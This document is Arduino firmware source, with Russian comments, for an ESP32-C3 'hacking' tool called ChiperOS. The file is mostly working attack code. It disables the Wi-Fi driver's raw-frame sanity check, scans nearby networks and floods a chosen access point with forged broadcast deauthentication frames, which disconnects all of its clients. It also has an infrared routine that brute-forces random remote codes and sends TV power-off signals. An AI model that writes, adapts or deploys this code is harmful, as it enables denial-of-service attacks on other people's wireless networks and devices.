// ═══════════════════════════════════════════════════════════════
// ChiperOS v1 BETA - ESP32-C3 Super Mini
// WiFi Deauth (Bruce-style) + IR Control
// ИСПРАВЛЕНО: инициализация WiFi
// ═══════════════════════════════════════════════════════════════

#include <Arduino.h>
#include <WiFi.h>
#include <esp_wifi.h>
#include <esp_wifi_types.h>
#include <IRremoteESP8266.h>
#include <IRsend.h>

#define IR_PIN 4
IRsend irSender(IR_PIN);

#define LG_POWER_CODE 0x20DF0CF3
#define SAMSUNG_POWER_CODE 0xE0E040BF

// ═══════════════════════════════════════════════════════════════
// Обход проверки драйвера (Bruce-style)
// ═══════════════════════════════════════════════════════════════
extern "C" int __wrap_ieee80211_raw_frame_sanity_check(int32_t arg, int32_t arg2, int32_t arg3) {
    return 0;
}

// ═══════════════════════════════════════════════════════════════
// Структуры данных
// ═══════════════════════════════════════════════════════════════
typedef struct {
    String ssid;
    uint8_t bssid[6];
    int32_t rssi;
    uint8_t channel;
} WiFiNetwork;

// ═══════════════════════════════════════════════════════════════
// Глобальные переменные
// ═══════════════════════════════════════════════════════════════
#define MAX_NETWORKS 30
WiFiNetwork networks[MAX_NETWORKS];
int networkCount = 0;

bool deauthActive = false;
int targetChannel = 1;
uint8_t targetAP[6] = {0};
unsigned long lastDeauth = 0;

// ═══════════════════════════════════════════════════════════════
// Deauth кадр (Bruce-style)
// ═══════════════════════════════════════════════════════════════
uint8_t deauth_frame[26] = {
    0xC0, 0x00,                         // Frame Control: Deauth
    0x00, 0x00,                         // Duration
    0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, // Addr1: Broadcast
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr2: Source (AP MAC)
    0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // Addr3: BSSID (AP MAC)
    0x00, 0x00,                         // Sequence
    0x07, 0x00                          // Reason: Class 3 frame
};

// ═══════════════════════════════════════════════════════════════
// Вспомогательные функции
// ═══════════════════════════════════════════════════════════════
void printMac(uint8_t* mac) {
    for (int i = 0; i < 6; i++) {
        Serial.printf("%02X", mac[i]);
        if (i < 5) Serial.print(":");
    }
}

// ═══════════════════════════════════════════════════════════════
// Инициализация WiFi для атаки
// ═══════════════════════════════════════════════════════════════
void initWiFiForAttack() {
    // Отключаем WiFi
    WiFi.disconnect(true);
    delay(200);
    
    // Устанавливаем режим AP
    WiFi.mode(WIFI_AP);
    delay(200);
    
    // Создаем точку доступа
    WiFi.softAP("ChiperOS", "12345678", 1);
    delay(200);
    
    // Включаем promiscuous mode
    esp_wifi_set_promiscuous(true);
}

// ═══════════════════════════════════════════════════════════════
// Отправка Deauth пакета
// ═══════════════════════════════════════════════════════════════
void sendDeauthPacket(uint8_t* ap, int channel) {
    esp_wifi_set_channel(channel, WIFI_SECOND_CHAN_NONE);
    
    memcpy(&deauth_frame[10], ap, 6);
    memcpy(&deauth_frame[16], ap, 6);
    
    // КЛЮЧЕВОЙ МОМЕНТ: 4-й аргумент = true
    esp_err_t err = esp_wifi_80211_tx(WIFI_IF_AP, deauth_frame, sizeof(deauth_frame), true);
    
    if (err != ESP_OK) {
        Serial.printf("TX err: %d\n", err);
    }
}

// ═══════════════════════════════════════════════════════════════
// Сканирование сетей (ПРОСТОЙ МЕТОД через Arduino WiFi)
// ═══════════════════════════════════════════════════════════════
void scanNetworks() {
    Serial.println("\n🔍 Сканирование WiFi сетей...\n");
    
    if (deauthActive) {
        deauthActive = false;
        Serial.println("⏹ Deauth остановлен");
    }
    
    // Отключаем WiFi если активен
    WiFi.disconnect(true);
    delay(500);
    
    // Устанавливаем режим STA
    WiFi.mode(WIFI_STA);
    delay(500);
    
    Serial.println("   Сканирование...");
    
    // Сканируем сети
    int n = WiFi.scanNetworks();
    
    if (n == WIFI_SCAN_RUNNING) {
        Serial.println("❌ Сканирование уже запущено");
        return;
    }
    
    if (n == WIFI_SCAN_FAILED) {
        Serial.println("❌ Сканирование не удалось");
        Serial.println("   Попробуйте ещё раз\n");
        return;
    }
    
    if (n <= 0) {
        Serial.println("❌ Сети не найдены\n");
        networkCount = 0;
        return;
    }
    
    networkCount = n;
    
    // Заполняем массив networks
    for (int i = 0; i < networkCount; i++) {
        networks[i].ssid = WiFi.SSID(i);
        networks[i].rssi = WiFi.RSSI(i);
        networks[i].channel = WiFi.channel(i);
        memcpy(networks[i].bssid, WiFi.BSSID(i), 6);
    }
    
    // Вывод результатов
    Serial.println("\n════╦══════════════════════╦══════╦═══════════════════╗");
    Serial.println("║ №  ║ SSID                 ║ CH   ║ MAC Address       ║");
    Serial.println("╠════╬══════════════════════╬══════╬═══════════════════╣");
    
    for (int i = 0; i < networkCount; i++) {
        Serial.printf("║ %-2d ║ %-20s ║ %-4d ║ ", 
            i + 1, 
            networks[i].ssid.substring(0, 20).c_str(), 
            networks[i].channel);
        printMac(networks[i].bssid);
        Serial.println(" ║");
    }
    Serial.println("════╩══════════════════════╩══════╩═══════════════════╝\n");
    Serial.printf("✅ Найдено сетей: %d\n", networkCount);
    Serial.println("Команда: <номер> deauth (например: 1 deauth)\n");
}

// ═══════════════════════════════════════════════════════════════
// Запуск Deauth атаки
// ═══════════════════════════════════════════════════════════════
void startDeauth(int networkNum) {
    if (networkCount == 0) {
        Serial.println("❌ Сначала выполните 'scan'");
        return;
    }
    
    int idx = networkNum - 1;
    if (idx < 0 || idx >= networkCount) {
        Serial.printf("❌ Неверный номер сети. Доступно: 1-%d\n", networkCount);
        return;
    }
    
    targetChannel = networks[idx].channel;
    memcpy(targetAP, networks[idx].bssid, 6);
    
    initWiFiForAttack();
    
    deauthActive = true;
    lastDeauth = millis();
    
    Serial.println("\n🎯 Deauth атака запущена!");
    Serial.printf("   Цель: %s\n", networks[idx].ssid.c_str());
    Serial.printf("   Канал: %d\n", targetChannel);
    Serial.print("   MAC: ");
    printMac(targetAP);
    Serial.println();
    Serial.println("   Команда 'stop' для остановки\n");
}

void stopDeauth() {
    deauthActive = false;
    esp_wifi_set_promiscuous(false);
    Serial.println("⏹ Deauth остановлен");
}

// ═══════════════════════════════════════════════════════════════
// IR функции
// ═══════════════════════════════════════════════════════════════
void sendIR_LG_Power() {
    Serial.println("📺 LG TV Power (NEC 0x20DF0CF3)...");
    irSender.sendNEC(LG_POWER_CODE, 32);
    delay(100);
    irSender.sendNEC(LG_POWER_CODE, 32);
    Serial.println("✅ Отправлено\n");
}

void sendIR_Samsung_Power() {
    Serial.println("📺 Samsung TV Power (NEC 0xE0E040BF)...");
    irSender.sendNEC(SAMSUNG_POWER_CODE, 32);
    delay(100);
    irSender.sendNEC(SAMSUNG_POWER_CODE, 32);
    Serial.println("✅ Отправлено\n");
}

void irBruteForce() {
    Serial.println("\n🔨 IR Brute-Force (1000 кодов NEC)...");
    Serial.println("⚠️  Направьте на устройство!");
    Serial.println("⏹  Команда 'stop' для остановки\n");
    
    for (int i = 0; i < 1000; i++) {
        if (Serial.available()) {
            String cmd = Serial.readStringUntil('\n');
            cmd.trim();
            if (cmd.equalsIgnoreCase("stop")) {
                Serial.println("⏹ Остановлено пользователем\n");
                return;
            }
        }
        
        uint32_t code = random(0x00000000, 0xFFFFFFFF);
        Serial.printf("   [%d/1000] 0x%08X\n", i + 1, code);
        irSender.sendNEC(code, 32);
        delay(200);
    }
    
    Serial.println("✅ Завершено\n");
}

// ═══════════════════════════════════════════════════════════════
// SETUP
// ═══════════════════════════════════════════════════════════════
void setup() {
    Serial.begin(115200);
    delay(1000);
    
    Serial.println("\n╔════════════════════════════════════════╗");
    Serial.println("║    ChiperOS v1 BETA (Bruce-style)      ║");
    Serial.println("║    ESP32-C3 Super Mini                 ║");
    Serial.println("╚════════════════════════════════════════╝\n");
    
    irSender.begin();
    Serial.println("✅ IR ready (GPIO 4)");
    
    // Инициализация WiFi
    WiFi.mode(WIFI_STA);
    WiFi.disconnect();
    delay(500);
    
    Serial.println("✅ WiFi ready");
    Serial.println("\n📋 COMMANDS:");
    Serial.println("   scan              - Сканировать сети");
    Serial.println("   <номер> deauth    - Deauth атака (например: 1 deauth)");
    Serial.println("   stop              - Остановить атаку");
    Serial.println("   lg / samsung      - IR команды");
    Serial.println("   brute             - IR Brute-Force");
    Serial.println("   help              - Справка\n");
}

// ═══════════════════════════════════════════════════════════════
// LOOP
// ═══════════════════════════════════════════════════════════════
void loop() {
    // Отправка deauth пакетов
    if (deauthActive) {
        if (millis() - lastDeauth > 50) { // 20 пакетов/сек
            sendDeauthPacket(targetAP, targetChannel);
            lastDeauth = millis();
        }
    }
    
    // Обработка команд
    if (Serial.available()) {
        String cmd = Serial.readStringUntil('\n');
        cmd.trim();
        
        if (cmd.endsWith(" deauth")) {
            int spaceIdx = cmd.indexOf(' ');
            if (spaceIdx > 0) {
                int num = cmd.substring(0, spaceIdx).toInt();
                startDeauth(num);
            }
        }
        else if (cmd == "scan") {
            scanNetworks();
        }
        else if (cmd == "stop") {
            if (deauthActive) {
                stopDeauth();
            }
        }
        else if (cmd == "lg") {
            sendIR_LG_Power();
        }
        else if (cmd == "samsung") {
            sendIR_Samsung_Power();
        }
        else if (cmd == "brute") {
            irBruteForce();
        }
        else if (cmd == "help") {
            Serial.println("\n📋 COMMANDS:");
            Serial.println("   scan              - Сканировать сети");
            Serial.println("   <номер> deauth    - Deauth атака");
            Serial.println("   stop              - Остановить");
            Serial.println("   lg / samsung      - IR команды");
            Serial.println("   brute             - IR Brute-Force\n");
        }
        else {
            Serial.println("❓ Неизвестная команда. Введите 'help'");
        }
    }
    
    delay(10);
}
